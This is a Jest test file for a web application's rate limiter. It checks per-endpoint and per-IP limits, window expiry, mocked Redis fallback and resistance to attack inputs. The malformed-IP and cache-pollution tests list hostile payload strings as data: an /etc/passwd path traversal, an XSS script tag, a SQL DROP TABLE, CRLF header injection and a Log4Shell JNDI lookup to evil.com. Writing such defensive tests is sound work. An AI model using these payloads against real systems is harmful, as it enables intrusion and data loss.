/**
 * Rate Limiter Security Testing
 * Tests for Task 1.5: Security Modules Testing
 * 
 * Coverage Areas:
 * - Rate limiting configuration validation
 * - Memory-based rate limiting security
 * - Redis rate limiting security (mocked)
 * - Different endpoint rate limits
 * - IP-based rate limiting
 * - Rate limit bypass prevention
 * - Configuration tampering protection
 */

// Mock Redis client
const mockRedisClient = {
  get: jest.fn(),
  setex: jest.fn(),
  incr: jest.fn(),
  expire: jest.fn(),
  quit: jest.fn(),
  on: jest.fn(),
  ping: jest.fn().mockResolvedValue('PONG'),
};

jest.mock('redis', () => ({
  createClient: jest.fn(() => mockRedisClient),
}));

// Import after mocking
import type { RateLimiterResult } from '@/lib/api/rateLimiter';

describe('Rate Limiter Security', () => {
  // We'll need to dynamically import and test the rate limiter
  let RateLimiter: any;
  let rateLimiter: any;
  
  beforeAll(async () => {
    // Dynamic import to ensure mocks are applied
    const module = await import('@/lib/api/rateLimiter');
    RateLimiter = (module as any).RateLimiter;
    rateLimiter = (module as any).rateLimiter;
  });

  beforeEach(() => {
    jest.clearAllMocks();
    jest.clearAllTimers();
    jest.useFakeTimers();
    
    // Clear memory cache
    const memoryCache = (globalThis as any).memoryCache;
    if (memoryCache) {
      memoryCache.clear();
    }
  });

  afterEach(() => {
    jest.useRealTimers();
  });

  describe('Rate Limit Configuration Security', () => {
    it('should have secure default rate limits', async () => {
      // Test that default limits are not too permissive
      const result = await rateLimiter.check('192.168.1.1', 'default');
      
      expect(result.limit).toBeLessThanOrEqual(120); // Max 120 requests per hour
      expect(result.limit).toBeGreaterThan(0); // Must have some limit
    });

    it('should have stricter limits for sensitive endpoints', async () => {
      const authResult = await rateLimiter.check('192.168.1.1', 'auth');
      const defaultResult = await rateLimiter.check('192.168.1.2', 'default');
      
      // Auth endpoint should have stricter limits
      expect(authResult.limit).toBeLessThan(defaultResult.limit);
      expect(authResult.limit).toBeLessThanOrEqual(10); // Max 10 auth attempts per window
    });

    it('should have appropriate limits for upload endpoints', async () => {
      const uploadResult = await rateLimiter.check('192.168.1.1', 'upload');
      
      expect(uploadResult.limit).toBeLessThanOrEqual(60); // Max 60 uploads per hour
      expect(uploadResult.limit).toBeGreaterThan(0);
    });

    it('should handle unknown endpoints with default limits', async () => {
      const result = await rateLimiter.check('192.168.1.1', 'unknown_endpoint' as any);
      
      expect(result.limit).toBeGreaterThan(0);
      expect(result.success).toBe(true);
    });
  });

  describe('IP-based Rate Limiting Security', () => {
    it('should enforce separate limits per IP address', async () => {
      const ip1 = '192.168.1.1';
      const ip2 = '192.168.1.2';
      
      // Make requests from both IPs
      const result1 = await rateLimiter.check(ip1, 'default');
      const result2 = await rateLimiter.check(ip2, 'default');
      
      // Both should start with same limits
      expect(result1.limit).toBe(result2.limit);
      expect(result1.remaining).toBe(result2.remaining);
      
      // Remaining count should be independent
      expect(result1.success).toBe(true);
      expect(result2.success).toBe(true);
    });

    it('should prevent rate limit bypass through IP spoofing patterns', async () => {
      const suspiciousIPs = [
        '127.0.0.1',
        'localhost',
        '::1',
        '0.0.0.0',
        '255.255.255.255'
      ];
      
      for (const ip of suspiciousIPs) {
        const result = await rateLimiter.check(ip, 'default');
        // Should still apply rate limiting, not bypass
        expect(result.limit).toBeGreaterThan(0);
        expect(typeof result.remaining).toBe('number');
      }
    });

    it('should handle malformed IP addresses securely', async () => {
      const malformedIPs = [
        '',
        null as any,
        undefined as any,
        'not-an-ip',
        '999.999.999.999',
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'DROP TABLE users;'
      ];
      
      for (const ip of malformedIPs) {
        const result = await rateLimiter.check(ip, 'default');
        
        // Should handle gracefully without throwing
        expect(result).toBeDefined();
        expect(typeof result.success).toBe('boolean');
        expect(typeof result.limit).toBe('number');
      }
    });
  });

  describe('Memory Cache Security', () => {
    it('should isolate rate limits between different endpoints for same IP', async () => {
      const ip = '192.168.1.1';
      
      // Make requests to different endpoints
      const authResult = await rateLimiter.check(ip, 'auth');
      const uploadResult = await rateLimiter.check(ip, 'upload');
      
      // Should have different limits and not interfere
      expect(authResult.limit).not.toBe(uploadResult.limit);
      expect(authResult.remaining).toBe(authResult.limit - 1);
      expect(uploadResult.remaining).toBe(uploadResult.limit - 1);
    });

    it('should properly expire rate limit windows', async () => {
      const ip = '192.168.1.1';
      
      // Make a request
      const initialResult = await rateLimiter.check(ip, 'auth');
      expect(initialResult.remaining).toBe(initialResult.limit - 1);
      
      // Fast-forward past the window
      jest.advanceTimersByTime(15 * 60 * 1000 + 1000); // 15 minutes + 1 second
      
      // Next request should reset the window
      const resetResult = await rateLimiter.check(ip, 'auth');
      expect(resetResult.remaining).toBe(resetResult.limit - 1);
    });

    it('should handle concurrent requests safely', async () => {
      const ip = '192.168.1.1';
      const endpoint = 'default';
      
      // Make multiple concurrent requests
      const promises = Array(5).fill(null).map(() => rateLimiter.check(ip, endpoint));
      const results = await Promise.all(promises);
      
      // All should succeed initially
      results.forEach(result => {
        expect(result.success).toBe(true);
        expect(result.limit).toBeGreaterThan(0);
      });
      
      // Remaining count should decrease properly
      const remainingCounts = results.map(r => r.remaining);
      const uniqueCounts = new Set(remainingCounts);
      expect(uniqueCounts.size).toBeGreaterThan(1); // Should have different remaining counts
    });
  });

  describe('Rate Limit Enforcement Security', () => {
    it('should deny requests after limit is exceeded', async () => {
      const ip = '192.168.1.1';
      const endpoint = 'auth'; // Lower limit for faster testing
      
      // Make requests up to the limit
      let result: RateLimiterResult;
      do {
        result = await rateLimiter.check(ip, endpoint);
      } while (result.success && result.remaining > 0);
      
      // Next request should be denied
      const deniedResult = await rateLimiter.check(ip, endpoint);
      expect(deniedResult.success).toBe(false);
      expect(deniedResult.remaining).toBe(0);
    });

    it('should include proper reset time in responses', async () => {
      const ip = '192.168.1.1';
      const result = await rateLimiter.check(ip, 'default');
      
      expect(result.reset).toBeGreaterThan(Date.now());
      expect(result.reset).toBeLessThan(Date.now() + (60 * 60 * 1000) + 1000); // Within 1 hour + 1 second
    });

    it('should not allow negative remaining counts', async () => {
      const ip = '192.168.1.1';
      const endpoint = 'auth';
      
      // Make many requests to exceed the limit
      for (let i = 0; i < 20; i++) {
        const result = await rateLimiter.check(ip, endpoint);
        expect(result.remaining).toBeGreaterThanOrEqual(0);
      }
    });
  });

  describe('Redis Integration Security (Mocked)', () => {
    beforeEach(() => {
      // Mock successful Redis operations
      mockRedisClient.get.mockResolvedValue(null);
      mockRedisClient.incr.mockResolvedValue(1);
      mockRedisClient.setex.mockResolvedValue('OK');
      mockRedisClient.expire.mockResolvedValue(1);
    });

    it('should handle Redis connection failures gracefully', async () => {
      // Mock Redis connection failure
      mockRedisClient.incr.mockRejectedValue(new Error('Redis connection failed'));
      
      // Should fallback to memory cache
      const result = await rateLimiter.check('192.168.1.1', 'default');
      
      expect(result).toBeDefined();
      expect(typeof result.success).toBe('boolean');
      expect(typeof result.limit).toBe('number');
    });

    it('should not leak sensitive data in Redis keys', async () => {
      mockRedisClient.incr.mockResolvedValue(1);
      
      await rateLimiter.check('192.168.1.1', 'default');
      
      // Check that Redis keys don't contain sensitive information
      const calls = mockRedisClient.incr.mock.calls;
      if (calls.length > 0) {
        const key = calls[0][0];
        expect(key).not.toContain('password');
        expect(key).not.toContain('secret');
        expect(key).not.toContain('token');
      }
    });

    it('should handle Redis timeout gracefully', async () => {
      // Mock slow Redis response
      mockRedisClient.incr.mockImplementation(() => 
        new Promise((resolve) => setTimeout(() => resolve(1), 5000))
      );
      
      const result = await rateLimiter.check('192.168.1.1', 'default');
      
      // Should not hang indefinitely
      expect(result).toBeDefined();
    });
  });

  describe('Attack Vector Prevention', () => {
    it('should prevent cache pollution attacks', async () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        '<script>alert("xss")</script>',
        'user\r\nX-Injected: header',
        'null\0byte',
        Array(10000).fill('A').join(''), // Very long string
      ];
      
      for (const input of maliciousInputs) {
        const result = await rateLimiter.check(input, 'default');
        
        // Should handle without throwing or corrupting cache
        expect(result).toBeDefined();
        expect(typeof result.success).toBe('boolean');
      }
    });

    it('should prevent algorithmic complexity attacks', async () => {
      const startTime = Date.now();
      
      // Make many requests with different IPs
      const promises = Array(100).fill(null).map((_, i) => 
        rateLimiter.check(`192.168.1.${i}`, 'default')
      );
      
      await Promise.all(promises);
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      // Should complete in reasonable time (not exponential)
      expect(duration).toBeLessThan(5000); // 5 seconds max
    });

    it('should prevent memory exhaustion attacks', async () => {
      // Simulate many unique IPs to test memory usage
      const uniqueIPs = Array(1000).fill(null).map((_, i) => `192.168.${Math.floor(i/254)}.${i%254}`);
      
      for (const ip of uniqueIPs) {
        const result = await rateLimiter.check(ip, 'default');
        expect(result).toBeDefined();
      }
      
      // Memory usage should be reasonable (test passes if no out-of-memory error)
    });
  });

  describe('Configuration Integrity', () => {
    it('should not allow runtime modification of rate limits', async () => {
      const originalResult = await rateLimiter.check('192.168.1.1', 'auth');
      const originalLimit = originalResult.limit;
      
      // Attempt to modify configuration (should not affect behavior)
      try {
        (global as any).RATE_LIMIT_CONFIGS = { auth: { maxRequests: 999999, windowMs: 1000 } };
      } catch (e) {
        // Expected to fail or be ignored
      }
      
      const newResult = await rateLimiter.check('192.168.1.2', 'auth');
      expect(newResult.limit).toBe(originalLimit);
    });

    it('should use secure defaults for all endpoint types', async () => {
      const endpoints = ['auth', 'upload', 'results', 'default'];
      
      for (const endpoint of endpoints) {
        const result = await rateLimiter.check('192.168.1.1', endpoint as any);
        
        // All endpoints should have reasonable limits
        expect(result.limit).toBeGreaterThan(0);
        expect(result.limit).toBeLessThan(1000); // Not excessive
        expect(typeof result.reset).toBe('number');
        expect(result.reset).toBeGreaterThan(Date.now());
      }
    });
  });
});